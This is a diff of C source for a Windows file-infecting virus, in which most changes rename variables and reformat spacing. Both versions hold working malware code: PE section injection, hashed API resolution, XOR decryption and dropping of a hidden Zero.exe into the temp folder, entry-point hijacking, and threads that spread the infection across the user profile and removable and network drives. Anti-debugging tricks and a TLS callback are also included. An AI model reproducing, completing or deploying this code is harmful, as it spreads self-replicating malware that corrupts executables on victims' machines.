@@ -11,7 +11,7 @@
 #pragma comment(linker,"/include:__tls_used")
 #pragma section(".CRT$XLB",read)
  
-#define Align(Value,Alignment) (((Value+Alignment-1)/Alignment)*Alignment)
+#define Align(Value,Alignment) (((Value + Alignment-1)/Alignment)*Alignment)
 #define VIRUS_KEY 0xF4
 #define VIRUS_FLAG ((VIRUS_KEY^0x7FFFFFFF)^0xF0F0F0F0)
  
@@ -104,62 +104,70 @@ extern "C" NTSTATUS NTAPI NtRaiseHardError(
     PULONG Response
 );
  
-PVOID VirusFile;
-ULONG VirusSize;
+PVOID p_virus_file;
+ULONG virus_size;
  
 PIMAGE_SECTION_HEADER WINAPI AddSection(PVOID Image, const char* SectionName,ULONG SectionSize,ULONG Characteristics)
 {
-    PIMAGE_DOS_HEADER pIDH;
-    PIMAGE_NT_HEADERS pINH;
-    PIMAGE_SECTION_HEADER pISH;
+    PIMAGE_DOS_HEADER p_image_dos_header;
+    PIMAGE_NT_HEADERS p_image_nt_headers;
+    PIMAGE_SECTION_HEADER p_image_section_header;
  
     ULONG i;
- 
-    pIDH=(PIMAGE_DOS_HEADER)Image;
- 
-    if(pIDH->e_magic!=IMAGE_DOS_SIGNATURE)
+
+    p_image_dos_header = (PIMAGE_DOS_HEADER)Image;
+
+    if(p_image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
     {
         return NULL;
     }
  
-    pINH=(PIMAGE_NT_HEADERS)((PUCHAR)Image+pIDH->e_lfanew);
+    p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)Image + p_image_dos_header->e_lfanew);
  
-    if(pINH->Signature!=IMAGE_NT_SIGNATURE)
+    if(p_image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
     {
         return NULL;
     }
  
-    pISH=(PIMAGE_SECTION_HEADER)(pINH+1);
-    i=pINH->FileHeader.NumberOfSections;
+    p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers + 1);
+    i = p_image_nt_headers->FileHeader.NumberOfSections;
  
-    memset(&pISH[i],0,sizeof(IMAGE_SECTION_HEADER));
+    memset(&p_image_section_header[i], 0, sizeof(IMAGE_SECTION_HEADER));
  
-    pISH[i].Characteristics=Characteristics;
-    pISH[i].PointerToRawData=Align(pISH[i-1].PointerToRawData+pISH[i-1].SizeOfRawData,pINH->OptionalHeader.FileAlignment);
-    pISH[i].VirtualAddress=Align(pISH[i-1].VirtualAddress+pISH[i-1].Misc.VirtualSize,pINH->OptionalHeader.SectionAlignment);
-    pISH[i].SizeOfRawData=Align(SectionSize,pINH->OptionalHeader.SectionAlignment);
-    pISH[i].Misc.VirtualSize=SectionSize;
+    p_image_section_header[i].Characteristics = Characteristics;
+
+    p_image_section_header[i].PointerToRawData = Align(
+        p_image_section_header[i-1].PointerToRawData + p_image_section_header[i-1].SizeOfRawData,p_image_nt_headers->OptionalHeader.FileAlignment);
+
+    p_image_section_header[i].VirtualAddress = Align(
+        p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize,p_image_nt_headers->OptionalHeader.SectionAlignment);
+    
+    p_image_section_header[i].SizeOfRawData = Align(
+        SectionSize,
+        p_image_nt_headers->OptionalHeader.SectionAlignment);
+
+    p_image_section_header[i].Misc.VirtualSize = SectionSize;
  
-    memcpy(pISH[i].Name,SectionName,8);
+    memcpy(p_image_section_header[i].Name,SectionName,8);
  
-    pINH->FileHeader.NumberOfSections++;
-    pINH->OptionalHeader.SizeOfImage=pISH[i].VirtualAddress+pISH[i].Misc.VirtualSize;
+    p_image_nt_headers->FileHeader.NumberOfSections++;
+    p_image_nt_headers->OptionalHeader.SizeOfImage = p_image_section_header[i].VirtualAddress + p_image_section_header[i].Misc.VirtualSize;
  
-    pINH->OptionalHeader.CheckSum=0;
-    return &pISH[i];
+    p_image_nt_headers->OptionalHeader.CheckSum = 0;
+    return &p_image_section_header[i];
 }
- 
+
 int WINAPI VirusCode()
 {
-    PIMAGE_DOS_HEADER pIDH;
-    PIMAGE_NT_HEADERS pINH;
-    PIMAGE_EXPORT_DIRECTORY pIED;
+    PIMAGE_DOS_HEADER p_image_dos_header;
+    PIMAGE_NT_HEADERS p_image_nt_headers;
+    PIMAGE_EXPORT_DIRECTORY p_image_export_directory;
  
     PPEB Peb;
     PLDR_DATA_TABLE_ENTRY Ldr;
  
-    PVOID Buffer,Module,Kernel32Base;
-    ULONG i,Hash,FileSize,EntryPointRva,VirusRva,write;
+    PVOID Buffer, Module, Kernel32Base;
+    ULONG i, Hash, FileSize, EntryPointRva, VirusRva, write;
  
     PUCHAR EncryptedVirus,DecryptedVirus,ptr;
     PULONG Function,Name;
@@ -179,7 +187,7 @@ int WINAPI VirusCode()
     pVirtualFree fnVirtualFree;
     pCreateProcessA fnCreateProcessA;
  
-    char FilePath[]={'%','t','e','m','p','%','\\','Z','e','r','o','.','e','x','e',0},FileName[260];
+    char FilePath[] = {'%','t','e','m','p','%','\\','Z','e','r','o','.','e','x','e',0},FileName[260];
  
     __asm
     {
@@ -193,114 +201,114 @@ int WINAPI VirusCode()
         mov FileSize,eax
     }
  
-    Peb=NtCurrentPeb(); // Get the PEB
-    Ldr=CONTAINING_RECORD(Peb->Ldr->InMemoryOrderModuleList.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Read the loader data
+    Peb = NtCurrentPeb(); // Get the PEB
+    Ldr = CONTAINING_RECORD(Peb->Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Read the loader data
  
-    Module=Ldr->DllBase; // Process executable
+    Module = Ldr->DllBase; // Process executable
  
-    Ldr=CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // ntdll (not used)
-    Ldr=CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // kernel32
+    Ldr  =  CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // ntdll (not used)
+    Ldr  =  CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // kernel32
  
-    Kernel32Base=Ldr->DllBase; // Store the address of kernel32
+    Kernel32Base = Ldr->DllBase; // Store the address of kernel32
  
-    pIDH=(PIMAGE_DOS_HEADER)Kernel32Base;
-    pINH=(PIMAGE_NT_HEADERS)((PUCHAR)Kernel32Base+pIDH->e_lfanew);
+    p_image_dos_header = (PIMAGE_DOS_HEADER)Kernel32Base;
+    p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)Kernel32Base + p_image_dos_header->e_lfanew);
  
     // Get the export directory of kernel32
  
-    pIED=(PIMAGE_EXPORT_DIRECTORY)((PUCHAR)Kernel32Base+pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    p_image_export_directory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)Kernel32Base + p_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  
-    Function=(PULONG)((PUCHAR)Kernel32Base+pIED->AddressOfFunctions);
-    Name=(PULONG)((PUCHAR)Kernel32Base+pIED->AddressOfNames);
+    Function = (PULONG)((PUCHAR)Kernel32Base + p_image_export_directory->AddressOfFunctions);
+    Name = (PULONG)((PUCHAR)Kernel32Base + p_image_export_directory->AddressOfNames);
  
-    Ordinal=(PUSHORT)((PUCHAR)Kernel32Base+pIED->AddressOfNameOrdinals);
+    Ordinal = (PUSHORT)((PUCHAR)Kernel32Base + p_image_export_directory->AddressOfNameOrdinals);
  
     // Loop over the function names
  
-    for(i=0;i<pIED->NumberOfNames;i++)
+    for(i = 0;i < p_image_export_directory->NumberOfNames;i++)
     {
-        PUCHAR ptr=(PUCHAR)Kernel32Base+Name[i]; // Pointer to function name
-        ULONG Hash=0;
+        PUCHAR ptr = (PUCHAR)Kernel32Base + Name[i]; // Pointer to function name
+        ULONG Hash = 0;
  
         // Compute the hash
  
         while(*ptr)
         {
-            Hash=((Hash<<8)+Hash+*ptr)^(*ptr<<16);
+            Hash = ((Hash<<8) + Hash + *ptr)^(*ptr<<16);
             ptr++;
         }
  
         // Hash of ExpandEnvironmentStringsA
  
-        if(Hash==0x575d1e20)
+        if(Hash == 0x575d1e20)
         {
-            fnExpandEnvironmentStringsA=(pExpandEnvironmentStringsA)((PUCHAR)Kernel32Base+Function[Ordinal[i]]);
+            fnExpandEnvironmentStringsA = (pExpandEnvironmentStringsA)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
         }
  
         // Hash of CreateFileA
  
-        if(Hash==0xd83eb415)
+        if(Hash == 0xd83eb415)
         {
-            fnCreateFileA=(pCreateFileA)((PUCHAR)Kernel32Base+Function[Ordinal[i]]);
+            fnCreateFileA = (pCreateFileA)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
         }
  
         // Hash of WriteFile
  
-        if(Hash==0xa5e7378b)
+        if(Hash == 0xa5e7378b)
         {
-            fnWriteFile=(pWriteFile)((PUCHAR)Kernel32Base+Function[Ordinal[i]]);
+            fnWriteFile = (pWriteFile)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
         }
  
         // Hash of VirtualAlloc
  
-        if(Hash==0xa15d96d2)
+        if(Hash == 0xa15d96d2)
         {
-            fnVirtualAlloc=(pVirtualAlloc)((PUCHAR)Kernel32Base+Function[Ordinal[i]]);
+            fnVirtualAlloc = (pVirtualAlloc)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
         }
  
         // Hash of CloseHandle
  
-        if(Hash==0x7dfbd342)
+        if(Hash == 0x7dfbd342)
         {
-            fnCloseHandle=(pCloseHandle)((PUCHAR)Kernel32Base+Function[Ordinal[i]]);
+            fnCloseHandle = (pCloseHandle)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
         }
  
         // Hash of VirtualFree
  
-        if(Hash==0x6f043b69)
+        if(Hash == 0x6f043b69)
         {
-            fnVirtualFree=(pVirtualFree)((PUCHAR)Kernel32Base+Function[Ordinal[i]]);
+            fnVirtualFree = (pVirtualFree)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
         }
  
         // Hash of CreateProcessA
  
-        if(Hash==0xae3b3c74)
+        if(Hash == 0xae3b3c74)
         {
-            fnCreateProcessA=(pCreateProcessA)((PUCHAR)Kernel32Base+Function[Ordinal[i]]);
+            fnCreateProcessA = (pCreateProcessA)((PUCHAR)Kernel32Base + Function[Ordinal[i]]);
         }
     }
  
-    EncryptedVirus=(PUCHAR)Module+VirusRva; // Get the virus body
-    Buffer=fnVirtualAlloc(NULL,FileSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE); // Allocate buffer
+    EncryptedVirus = (PUCHAR)Module + VirusRva; // Get the virus body
+    Buffer = fnVirtualAlloc(NULL,FileSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE); // Allocate buffer
  
     if(Buffer)
     {
-        DecryptedVirus=(PUCHAR)Buffer;
+        DecryptedVirus = (PUCHAR)Buffer;
  
         // Decrypt the virus
  
-        for(i=0;i<FileSize;i++)
+        for(i = 0;i<FileSize;i++)
         {
-            DecryptedVirus[i]=EncryptedVirus[i]^VIRUS_KEY;
+            DecryptedVirus[i] = EncryptedVirus[i]^VIRUS_KEY;
         }
  
         fnExpandEnvironmentStringsA(FilePath,FileName,sizeof(FileName));
  
         // Drop the virus in temp folder
  
-        hFile=fnCreateFileA(FileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
+        hFile = fnCreateFileA(FileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
  
-        if(hFile!=INVALID_HANDLE_VALUE)
+        if(hFile != INVALID_HANDLE_VALUE)
         {
             // Write the virus to file
  
@@ -309,20 +317,20 @@ int WINAPI VirusCode()
                 fnCloseHandle(hFile); // Close the file handle
                 fnVirtualFree(Buffer,0,MEM_RELEASE); // Free the buffer
  
-                ptr=(PUCHAR)&si;
+                ptr = (PUCHAR)&si;
  
                 // Zero the structures
  
-                for(i=0;i<sizeof(si);i++)
+                for(i = 0;i<sizeof(si);i++)
                 {
-                    ptr[i]=0;
+                    ptr[i] = 0;
                 }
  
-                ptr=(PUCHAR)&pi;
+                ptr = (PUCHAR)&pi;
  
-                for(i=0;i<sizeof(pi);i++)
+                for(i = 0;i<sizeof(pi);i++)
                 {
-                    ptr[i]=0;
+                    ptr[i] = 0;
                 }
  
                 // Run the virus executable
@@ -338,7 +346,7 @@ int WINAPI VirusCode()
  
     // Call the original entry point
  
-    EntryPoint=(FARPROC)((PUCHAR)Module+EntryPointRva);
+    EntryPoint = (FARPROC)((PUCHAR)Module + EntryPointRva);
     return EntryPoint();
 }
  
@@ -349,14 +357,14 @@ void WINAPI VirusEnd()
  
 BOOL WINAPI IsValidExecutable(HANDLE hFile,PULONG SectionAlignment)
 {
-    PIMAGE_DOS_HEADER pIDH;
-    PIMAGE_NT_HEADERS pINH;
+    PIMAGE_DOS_HEADER p_image_dos_header;
+    PIMAGE_NT_HEADERS p_image_nt_headers;
      
     PVOID Buffer;
     ULONG FileSize,read;
  
-    FileSize=GetFileSize(hFile,NULL);
-    Buffer=VirtualAlloc(NULL,FileSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    FileSize = GetFileSize(hFile,NULL);
+    Buffer = VirtualAlloc(NULL,FileSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
  
     if(!Buffer)
     {
@@ -371,17 +379,17 @@ BOOL WINAPI IsValidExecutable(HANDLE hFile,PULONG SectionAlignment)
  
     __try
     {
-        pIDH=(PIMAGE_DOS_HEADER)Buffer;
+        p_image_dos_header = (PIMAGE_DOS_HEADER)Buffer;
          
-        if(pIDH->e_magic!=IMAGE_DOS_SIGNATURE)
+        if(p_image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
         {
             VirtualFree(Buffer,0,MEM_RELEASE);
             return FALSE;
         }
  
-        pINH=(PIMAGE_NT_HEADERS)((PUCHAR)Buffer+pIDH->e_lfanew);
+        p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)Buffer + p_image_dos_header->e_lfanew);
  
-        if(pINH->Signature!=IMAGE_NT_SIGNATURE)
+        if(p_image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
         {
             VirtualFree(Buffer,0,MEM_RELEASE);
             return FALSE;
@@ -389,35 +397,35 @@ BOOL WINAPI IsValidExecutable(HANDLE hFile,PULONG SectionAlignment)
  
         // Make sure it is 32-bit program
  
-        if(pINH->FileHeader.Machine!=IMAGE_FILE_MACHINE_I386)
+        if(p_image_nt_headers->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
         {
             VirtualFree(Buffer,0,MEM_RELEASE);
             return FALSE;
         }
  
-        if(pINH->FileHeader.Characteristics & IMAGE_FILE_DLL)
+        if(p_image_nt_headers->FileHeader.Characteristics & IMAGE_FILE_DLL)
         {
             VirtualFree(Buffer,0,MEM_RELEASE);
             return FALSE;
         }
  
-        if(pINH->OptionalHeader.LoaderFlags==VIRUS_FLAG)
+        if(p_image_nt_headers->OptionalHeader.LoaderFlags == VIRUS_FLAG)
         {
             VirtualFree(Buffer,0,MEM_RELEASE);
             return FALSE;
         }
  
-        if(pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress)
+        if(p_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress)
         {
             VirtualFree(Buffer,0,MEM_RELEASE);
             return FALSE;
         }
  
-        if(pINH->OptionalHeader.Subsystem==IMAGE_SUBSYSTEM_WINDOWS_CUI || pINH->OptionalHeader.Subsystem==IMAGE_SUBSYSTEM_WINDOWS_GUI)
+        if(p_image_nt_headers->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI || p_image_nt_headers->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_GUI)
         {
             if(SectionAlignment)
             {
-                *SectionAlignment=pINH->OptionalHeader.SectionAlignment;
+                *SectionAlignment = p_image_nt_headers->OptionalHeader.SectionAlignment;
             }
              
             VirtualFree(Buffer,0,MEM_RELEASE);
@@ -437,90 +445,93 @@ BOOL WINAPI IsValidExecutable(HANDLE hFile,PULONG SectionAlignment)
  
 void WINAPI InfectFile(PSTR FileName)
 {
-    PIMAGE_DOS_HEADER pIDH;
-    PIMAGE_NT_HEADERS pINH;
-    PIMAGE_SECTION_HEADER pISH;
+    PIMAGE_DOS_HEADER p_image_dos_header;
+    PIMAGE_NT_HEADERS p_image_nt_headers;
+    PIMAGE_SECTION_HEADER p_image_section_header;
      
     HANDLE hFile,hMap;
     PVOID MappedFile;
     ULONG i,FileSize,SectionSize,CodeSize,SectionAlignment,AlignedSize,OldChecksum,NewChecksum;
  
-    PUCHAR CodeAddress,VirusAddress,ptr;
+    PUCHAR CodeAddress, VirusAddress, ptr;
  
-    hFile=CreateFileA(FileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
+    hFile = CreateFileA(FileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
  
-    if(hFile!=INVALID_HANDLE_VALUE)
+    if(hFile != INVALID_HANDLE_VALUE)
     {
-        if(!IsValidExecutable(hFile,&SectionAlignment))
+        if(!IsValidExecutable(hFile, &SectionAlignment))
         {
             NtClose(hFile);
             return;
         }
  
-        CodeSize=(ULONG)VirusEnd-(ULONG)VirusCode;
-        SectionSize = CodeSize + VirusSize;
- 
-        FileSize=GetFileSize(hFile,NULL);
-        AlignedSize=FileSize + Align(SectionSize,SectionAlignment); // File size need to be aligned. Otherwise the program will not run after infection.
- 
-        hMap=CreateFileMapping(hFile,NULL,PAGE_READWRITE,0,AlignedSize,NULL);
+        CodeSize = (ULONG)VirusEnd-(ULONG)VirusCode;
+        SectionSize  =  CodeSize + virus_size;
+
+        FileSize = GetFileSize(hFile,NULL);
+        AlignedSize = FileSize + Align(SectionSize, SectionAlignment); // File size need to be aligned. Otherwise the program will not run after infection.
+
+        // Create a mapping of a file (original file does not change when we change content in 
+        // the mapping file, to apply the change in mapped file to the original file, use 
+        // FlushViewOfFile())
+        hMap = CreateFileMapping(hFile,NULL,PAGE_READWRITE,0,AlignedSize,NULL);
  
         if(hMap)
         {
-            MappedFile=MapViewOfFile(hMap,FILE_MAP_ALL_ACCESS,0,0,0);
+            MappedFile = MapViewOfFile(hMap,FILE_MAP_ALL_ACCESS,0,0,0);
  
             if(MappedFile)
             {
-                pIDH=(PIMAGE_DOS_HEADER)MappedFile;
-                pINH=(PIMAGE_NT_HEADERS)((PUCHAR)MappedFile+pIDH->e_lfanew);
+                PIMAGE_DOS_HEADER p_image_dos_header = (PIMAGE_DOS_HEADER)MappedFile;
+                p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)MappedFile + p_image_dos_header->e_lfanew);
+
+                // Add a new section to contain virus code and return IMAGE_SECTION_HEADER of that virus section
+                p_image_section_header  =  AddSection(MappedFile , "Zero", SectionSize, IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE);
  
-                // Add a new section
- 
-                pISH = AddSection(MappedFile,"Zero",SectionSize,IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE);
- 
-                if(pISH)
+                if(p_image_section_header)
                 {
-                    ptr=(PUCHAR)MappedFile+pISH->PointerToRawData;
+                    
+                    ptr = (PUCHAR)MappedFile + p_image_section_header->PointerToRawData; // Begin of virus section
  
-                    CodeAddress=ptr;
-                    VirusAddress=CodeAddress+CodeSize;
+                    CodeAddress = ptr;
+                    VirusAddress = CodeAddress + CodeSize;
  
                     memcpy(CodeAddress,VirusCode,CodeSize); // Write the virus code to the file
-                    memcpy(VirusAddress,VirusFile,VirusSize); // Write the virus body to the file
+                    memcpy(VirusAddress,p_virus_file,virus_size); // Write the virus body to the file
  
                     // Fill up placeholders
  
                     while(1)
                     {
-                        if(*ptr==0xb8 && *(PULONG)(ptr+1)==0x41414141)
+                        if(*ptr == 0xb8 && *(PULONG)(ptr + 1) == 0x41414141)
                         {
-                            *(PULONG)(ptr+1)=pINH->OptionalHeader.AddressOfEntryPoint;
+                            *(PULONG)(ptr + 1) = p_image_nt_headers->OptionalHeader.AddressOfEntryPoint;
                             break;
                         }
  
                         ptr++;
                     }
  
-                    ptr=(PUCHAR)MappedFile+pISH->PointerToRawData;
+                    ptr = (PUCHAR)MappedFile + p_image_section_header->PointerToRawData;
  
                     while(1)
                     {
-                        if(*ptr==0xb8 && *(PULONG)(ptr+1)==0x42424242)
+                        if(*ptr == 0xb8 && *(PULONG)(ptr + 1) == 0x42424242)
                         {
-                            *(PULONG)(ptr+1)=(ULONG)VirusAddress-pISH->PointerToRawData+pISH->VirtualAddress-(ULONG)MappedFile;
+                            *(PULONG)(ptr + 1) = (ULONG)VirusAddress-p_image_section_header->PointerToRawData + p_image_section_header->VirtualAddress-(ULONG)MappedFile;
                             break;
                         }
  
                         ptr++;
                     }
  
-                    ptr=(PUCHAR)MappedFile+pISH->PointerToRawData;
+                    ptr = (PUCHAR)MappedFile + p_image_section_header->PointerToRawData;
  
                     while(1)
                     {
-                        if(*ptr==0xb8 && *(PULONG)(ptr+1)==0x43434343)
+                        if(*ptr == 0xb8 && *(PULONG)(ptr + 1) == 0x43434343)
                         {
-                            *(PULONG)(ptr+1)=VirusSize;
+                            *(PULONG)(ptr + 1) = virus_size;
                             break;
                         }
  
@@ -529,17 +540,17 @@ void WINAPI InfectFile(PSTR FileName)
  
                     // Encrypt the virus
  
-                    for(i=0;i<VirusSize;i++)
+                    for(i = 0;i<virus_size;i++)
                     {
-                        VirusAddress[i]^=VIRUS_KEY;
+                        VirusAddress[i] ^= VIRUS_KEY;
                     }
  
-                    pINH->OptionalHeader.AddressOfEntryPoint=(ULONG)CodeAddress-pISH->PointerToRawData+pISH->VirtualAddress-(ULONG)MappedFile; // Set the entry point
-                    pINH->OptionalHeader.LoaderFlags=VIRUS_FLAG; // Set the infection flag. Since Windows no longer use loader flag, we can use this to store our infection flag.
+                    p_image_nt_headers->OptionalHeader.AddressOfEntryPoint = (ULONG)CodeAddress-p_image_section_header->PointerToRawData + p_image_section_header->VirtualAddress-(ULONG)MappedFile; // Set the entry point
+                    p_image_nt_headers->OptionalHeader.LoaderFlags = VIRUS_FLAG; // Set the infection flag. Since Windows no longer use loader flag, we can use this to store our infection flag.
  
                     if(CheckSumMappedFile(MappedFile,AlignedSize,&OldChecksum,&NewChecksum))
                     {
-                        pINH->OptionalHeader.CheckSum=NewChecksum; // Correct the checksum
+                        p_image_nt_headers->OptionalHeader.CheckSum = NewChecksum; // Correct the checksum
                     }
  
                     FlushViewOfFile(MappedFile,0); // Flush the changes into file
@@ -564,20 +575,20 @@ void WINAPI SearchFile(PSTR Directory)
     char SearchName[1024],FullPath[1024];
     LARGE_INTEGER delay;
  
-    delay.QuadPart=(__int64)-10*10000;
+    delay.QuadPart = (__int64)-10*10000;
  
     memset(SearchName,0,sizeof(SearchName));
     memset(&FindData,0,sizeof(WIN32_FIND_DATAA));
  
     sprintf(SearchName,"%s\\*",Directory);
  
-    hFind = FindFirstFileA(SearchName, &FindData);
+    hFind  =  FindFirstFileA(SearchName, &FindData);
  
-    if(hFind!=INVALID_HANDLE_VALUE)
+    if(hFind != INVALID_HANDLE_VALUE)
     {
         while(FindNextFileA(hFind, &FindData))
         {
-            if(FindData.cFileName[0]=='.')
+            if(FindData.cFileName[0] == '.')
             {
                 continue;
             }
@@ -607,10 +618,10 @@ void NTAPI TlsCallback(PVOID Module,ULONG Reason,PVOID Context)
     HKEY hKey;
     char ModulePath[1024],TempPath[60];
      
-    PPEB Peb=NtCurrentPeb();
-    ULONG_PTR DebugPort=0;
+    PPEB Peb = NtCurrentPeb();
+    ULONG_PTR DebugPort = 0;
  
-    if(Reason!=DLL_PROCESS_ATTACH)
+    if(Reason != DLL_PROCESS_ATTACH)
     {
         return;
     }
@@ -644,7 +655,7 @@ void NTAPI TlsCallback(PVOID Module,ULONG Reason,PVOID Context)
     }
 }
  
-__declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK TlsCallbackAddress[]={TlsCallback,NULL};
+__declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK TlsCallbackAddress[] = {TlsCallback,NULL};
 
 DWORD WINAPI AntiDebug(PVOID p)
 {
@@ -653,10 +664,10 @@ DWORD WINAPI AntiDebug(PVOID p)
  
     ULONG Response;
     
-    PPEB Peb = NtCurrentPeb();
-    ULONG_PTR DebugPort=0;
+    PPEB Peb  =  NtCurrentPeb();
+    ULONG_PTR DebugPort = 0;
  
-    delay.QuadPart=(__int64)-10*10000;
+    delay.QuadPart = (__int64)-10*10000;
  
     while(1)
     {
@@ -680,7 +691,7 @@ DWORD WINAPI AntiDebug(PVOID p)
         */
         if(NT_SUCCESS(NtQueryInformationProcess(NtCurrentProcess(),ProcessDebugPort,&DebugPort,sizeof(ULONG_PTR),NULL)))
         {
-            if(DebugPort != 0)
+            if(DebugPort  !=  0)
             {
                 break;
             }
@@ -700,7 +711,7 @@ DWORD WINAPI InfectUserProfile(PVOID p)
     char UserProfile[1024];
     LARGE_INTEGER delay;
  
-    delay.QuadPart=(__int64)-600000*10000;
+    delay.QuadPart = (__int64)-600000*10000;
     GetEnvironmentVariableA("userprofile",UserProfile,sizeof(UserProfile)); // Get the path of user profile
      
     while(1)
@@ -717,27 +728,27 @@ DWORD WINAPI InfectDrives(PVOID p)
  
     LARGE_INTEGER delay;
  
-    delay.QuadPart=(__int64)-600000*10000;
+    delay.QuadPart = (__int64)-600000*10000;
  
     while(1)
     {
         memset(drives,0,sizeof(drives));
  
         GetLogicalDriveStringsA(sizeof(drives),drives); // Get all drives
-        str=drives;
+        str = drives;
  
         while(*str)
         {
-            DriveType=GetDriveTypeA(str); // Check the drive type
+            DriveType = GetDriveTypeA(str); // Check the drive type
  
             // Infect removable and network drives
  
-            if(DriveType==DRIVE_REMOVABLE || DriveType==DRIVE_REMOTE)
+            if(DriveType == DRIVE_REMOVABLE || DriveType == DRIVE_REMOTE)
             {
                 SearchFile(str); // Search for files to infect
             }
  
-            str+=strlen(str)+1; // Get the next drive
+            str += strlen(str) + 1; // Get the next drive
         }
  
         NtDelayExecution(FALSE,&delay);
@@ -751,24 +762,24 @@ int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow)
  
     CreateMutexA(NULL,TRUE,"{755842AD-901B-482D-81B3-010C4EB22197}");
  
-    if(GetLastError()==ERROR_ALREADY_EXISTS)
+    if(GetLastError() == ERROR_ALREADY_EXISTS)
     {
         NtTerminateProcess(NtCurrentProcess(),0);
         while(1);
     }
     
     // Get handle of current exe file for reading information
-    hFile = CreateFileA(_pgmptr,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
+    hFile  =  CreateFileA(_pgmptr,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
  
-    if(hFile!=INVALID_HANDLE_VALUE)
+    if(hFile != INVALID_HANDLE_VALUE)
     {
         // Khởi tạo bộ nhớ cho virus file
-        VirusSize = GetFileSize(hFile,NULL);
-        VirusFile = VirtualAlloc(NULL , VirusSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        virus_size  =  GetFileSize(hFile,NULL);
+        p_virus_file  =  VirtualAlloc(NULL , virus_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
  
-        if(VirusFile)
+        if(p_virus_file)
         {
-            if(!ReadFile(hFile,VirusFile,VirusSize,&read,NULL))
+            if(!ReadFile(hFile,p_virus_file,virus_size,&read,NULL))
             {
                 NtClose(hFile);
                 return -1;
@@ -776,7 +787,7 @@ int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow)
         }
  
         NtClose(hFile);
-        VirtualProtect(VirusFile,VirusSize,PAGE_READONLY,&op); // Protect the virus data
+        VirtualProtect(p_virus_file,virus_size,PAGE_READONLY,&op); // Protect the virus data
     }
  
     // Create worker threads
